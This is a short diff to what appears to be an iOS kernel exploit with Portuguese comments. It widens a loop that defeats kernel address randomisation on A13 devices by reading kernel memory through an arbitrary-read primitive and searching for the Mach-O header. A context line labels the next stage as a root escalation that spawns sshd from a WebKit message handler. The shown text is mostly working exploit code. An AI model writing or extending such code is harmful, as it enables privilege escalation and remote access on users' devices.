@@ -38,15 +38,20 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
 // 3. BUSCA DO KERNEL SLIDE (A13)
 - (uint64_t)getKernelSlide {
     if (_kernel_slide != 0) return _kernel_slide;
-    for (uint64_t i = 0; i < 0x100000; i++) {
+
+    // Aumentamos para 0x200000 iterações (varre uma área maior de memória)
+    for (uint64_t i = 0; i < 0x200000; i++) {
         uint64_t addr = 0xFFFFFFF007004000 + (i * 0x4000);
-        if (([self kread64:addr] & 0xFFFFFFFF) == 0xfeedfacf) {
+        uint64_t val = [self kread64:addr];
+        
+        if ((val & 0xFFFFFFFF) == 0xfeedfacf) {
             _kernel_slide = (i * 0x4000);
             return _kernel_slide;
         }
     }
     return 0;
 }
+
 
 // 4. TRIGGER: ESCALADA ROOT -> SPAWN SSHD
 - (void)userContentController:(WKUserContentController *)userContentController 
